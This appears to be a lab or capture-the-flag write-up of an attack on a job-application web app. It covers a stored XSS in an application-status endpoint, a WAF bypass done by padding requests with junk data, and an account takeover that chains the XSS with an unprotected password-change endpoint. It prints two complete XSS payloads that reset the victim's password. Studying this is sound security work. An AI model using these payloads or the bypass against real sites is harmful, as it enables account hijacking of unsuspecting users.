## Tools
[NoWaf](https://github.com/bazzofx/nowaf)  | Will add junk data to a payload to stop the WAF from monitoring it, WAFs avoid monitoring too large requests to save resources on device


![[Pasted image 20251231104659.png]]

# Exploring the App
Testing the different functionalities of the app, posting a job, applying for job, changing profile, etc. We notice there is an endpoint that sends an alert to the user when replayed, this is a PUT request made from **/api/applications/6/status**
![[Pasted image 20251231112134.png]]
Applicant receives confirmation on UI when request is sent, this is a good place for us to test XSS injection.
![[Pasted image 20251231112232.png]]

## Testing XSS
We will add our basic XSS to the payload and send it, unfortunately we are blocked by the WAF. So we will need to get around that as well.
```html
{"status":"accepted <img src=x onerror=alert(document.location)>"}
```
![[Pasted image 20251231112525.png]]

## Bypassing WAF
A common method to bypass WAFs is to overload them with junk data. Many WAFs are configured to stop inspecting requests that exceed a certain size to conserve server resources, allowing a malicious payload to pass through unnoticed if it's buried within
This python tool I created wrap your payload into the size you need depending on the WAF you are attempting to bypass [NoWaf](https://github.com/bazzofx/nowaf) tool , as well the Burp/Caido extension [nowafplz](https://github.com/assetnote/nowafpls)
![[Pasted image 20251231112935.png]]

## XSS+WAV Payload
Now we need to chain our XSS to deliver impact. As we continue to scout the application, we notice that password resets can be done without knowing the current password, and no CSRF token is used. With this knowledge we can craft a request that will trigger a password reset to the user by sending him our XSS pop  up.

On the application itself whenever the recruited approved an application, the applicant received a notification, via api **/status** this endpoint was vulnerable to XSS and is where we added our payload below.

> We have to scape the quote characters when modifying JSON payload, scape them with backslash \
### Payload1
This payload we are using an build in API call that fetches a URL to make the request for us on our XSS payload. Here we will need to convert the {newPassword:'password2'} to base64 before sending. The JS function **atob()** **converts from base64 to text**, and function **btoa()** **text to base64**.
We could also use [CyberChef](https://gchq.github.io/CyberChef/) or bash, burp encoder to help convert string to base64

```html
%% 
Convert {"newPassword":"password2"} to base64 
btoa('{"newPassword":"password2"}')
output: eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9
%%
<img src=x onerror=apiRequest('/api/profile/password',{'method':'PUT','body':atob('BASE_64')})>

%% After conversion looks like this  %% 
"status":"accepted<img src=\"x\" onerror=apiRequest('/api/profile/password',{method:'PUT',body:atob('eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9')})>"


```
### Payload2
This is an alternative payload and more generic using the fetch() function on Javascript.
```html
"status":"accepted<img src=\"x\" onerror=\"fetch('/api/profile/password',{method:'PUT',headers:{'content-type':'application/json'},body:JSON.stringify({newPassword:'password2'})})\">"
```
# Taking Over the Account
Once we sent the PUT request with our malicious payload to change the user password, if everything went well, we have not successfully change the user password and we owned the account.


